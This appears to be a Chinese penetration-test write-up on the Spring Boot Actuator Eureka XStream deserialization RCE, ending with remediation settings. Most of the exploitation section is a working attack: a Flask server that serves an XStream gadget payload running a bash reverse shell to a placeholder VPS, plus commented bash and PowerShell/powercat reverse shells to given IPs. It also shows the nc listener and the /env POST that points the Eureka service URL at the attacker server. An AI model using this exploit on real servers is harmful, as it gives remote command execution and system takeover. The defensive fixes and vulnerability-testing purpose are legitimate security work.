前言
--

发现内网多台服务器均存在该漏洞Spring Boot Actuator(eureka xstream deserialization RCE)，对该漏洞进行测试与修复

漏洞介绍
----

​ Actuator是Spring Boot提供的服务监控和管理中间件，默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限

​ XStream：XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。

​ /env端点配置不当造成RCE

### 影响版本

 eureka-client &lt; 1.8.7

### 风险等级

​ 严重

### 官方说明

actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：

```php
路径            描述
/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过
/beans         描述应用程序上下文里全部的Bean，以及它们的关系
/env           获取全部环境属性
/configprops   描述配置属性(包含默认值)如何注入Bean
/dump          获取线程活动的快照
/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供
/info          获取应用程序的定制信息，这些信息由info打头的属性提供
/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系
/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数
/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为true
/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)
```

漏洞利用
----

使用python3在vps服务器运行恶意构造的脚本，在根据具体情况填写反弹shell的ip和端口

```python
# -*- coding: utf-8 -*-
# @Time    : 2019/3/12 10:06
# @Author  : j1anFen
# @Site    :
# @File    : run.py

# linux反弹shell bash -i >&amp; /dev/tcp/192.168.20.82/9999 0>&amp;1
# windows反弹shell
# <string>powershell</string>
# <string>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</string>
# <string>powercat -c 192.168.123.1 -p 2333 -e cmd</string>

from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods = ['GET', 'POST'])
def catch_all(path):
    xml = """<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
      <dataHandler>
        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
          <is class="javax.crypto.CipherInputStream">
            <cipher class="javax.crypto.NullCipher">
              <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.Collections$EmptyIterator"/>
                  <next class="java.lang.ProcessBuilder">
                    <command>
                                <string>/bin/bash</string>
                      <string>-c</string>
                      <string>bash -i >&amp; /dev/tcp/yourvpsip/8446 0>&amp;1</string> 
                    </command>
                    <redirectErrorStream>false</redirectErrorStream>
                  </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                  <method>
                    <class>java.lang.ProcessBuilder</class>
                    <name>start</name>
                    <parameter-types/>
                  </method>
                  <name>foo</name>
                </filter>
                <next class="string">foo</next>
              </serviceIterator>
              <lock/>
            </cipher>
            <input class="java.lang.ProcessBuilder$NullInputStream"/>
            <ibuffer></ibuffer>
          </is>
        </dataSource>
      </dataHandler>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>"""
    return Response(xml, mimetype='application/xml')
if __name__ == "__main__":
    app.run(host=0.0.0.0', port=2222)
```

Nc监听一个端口用以接收反弹shell

```php
nc -lvnp 8446
```

访问/env端点获取全部环境属性，由于 actuator 会监控站点 mysql、mangodb 之类的数据库服务，所以通过监控信息有时可以展示mysql、mangodb 数据库信息

[![](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-cbf69e0f85a717f211b06428520f361e2af8638d.png)](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-cbf69e0f85a717f211b06428520f361e2af8638d.png)

写入配置，访问/env端点，抓包将get请求改为post请求，post内容为（该ip为开启恶意脚本的服务器的ip）：

eureka.client.serviceUrl.defaultZone=<http://ip:2335/xstream>

[![](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-28e954ac70c447816d2366761d45f7255603984e.png)](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-28e954ac70c447816d2366761d45f7255603984e.png)

返回的响应包

[![](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-0e2d859b39c74d8ea3dc0d5a898992dd5aeca6c5.png)](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-0e2d859b39c74d8ea3dc0d5a898992dd5aeca6c5.png)

这时已经查看服务器接收到shell，并且能成功执行命令，到这已经拿下服务器。

[![](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-fd39c0d198d11813c25038cc9a36db852b9a58f5.png)](https://shs3.b.qianxin.com/attack_forum/2021/05/attach-fd39c0d198d11813c25038cc9a36db852b9a58f5.png)

漏洞修复
----

毕竟是自家资产，该修复还是要修复的。

### 一 禁用所有接口：

```php
endpoints.enabled = false
```

### 二 pom.xml文件引入spring-boot-starter-security依赖：

```php
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

### 三 开启security功能，配置访问权限验证，类似配置如下：

```php
management.port=8099
management.security.enabled=true
security.user.name=xxxxx
security.user.password=xxxxxx
```